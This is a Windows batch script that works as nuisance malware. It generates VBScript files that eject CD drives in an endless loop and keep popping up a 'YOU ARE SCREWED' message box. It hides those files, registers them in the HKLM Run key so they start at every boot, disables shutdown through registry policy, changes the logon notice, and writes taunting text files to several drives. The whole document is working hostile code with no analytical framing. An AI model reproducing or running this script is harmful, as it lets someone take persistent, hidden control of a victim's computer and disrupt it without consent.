
@echo off
echo Set oWMP=CreateObject("WMplayer.OCX.7")>>123.vbs
echo Set colCDROMs=oWMP.cdromCollection>>123.vbs
echo do>>123.vbs
echo if colCDROMs.count>=1 then>>123.vbs
echo for i=0 to colCDROMs.Count -1>>123.vbs
echo colCDROMs.Item(i).Eject>>123.vbs
echo Next>>123.vbs
echo For i=0 to colCDROMs.Count -1>>123.vbs
echo colCDROMs.Item(i).Eject>>123.vbs
echo Next>>123.vbs
echo End If>>123.vbs
echo wscript.sleep 5000>>123.vbs
echo loop>>123.vbs
echo DO>>1234.vbs
echo MSGBOX "YOU ARE SCREWED!!!!!!!!!!!!",64,"ErR0r">>1234.vbs
echo LOOP>>1234.vbs
copy /y 123.vbs C:\
copy /y 1234.vbs C:\
attrib +s +h c:\123.vbs
attrib +s +h c:\1234.vbs
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoClose /t REG_DWORD /f /d 1
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticetext /f /d "YOR ARE BEEN SCREWED"
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticecaption /f /d "B0zZ_ErR0r"
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 123.vbs /d c:\123.vbs
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1234.vbs /d c:\1234.vbs
attrib +s +h c:\123.vbs
attrib +s +h c:\1234.vbs
start 123.vbs
start 1234.vbs
echo Code Smahser owns your computer!!>>c:\almasmalik.txt
echo Code Smahser owns your computer!!>>d:\almasmalik.txt
echo Code Smahser owns your computer!!>>e:\almasmalik.txt
msg * MAY YOUR COMPUTER "REST IN PEACE"
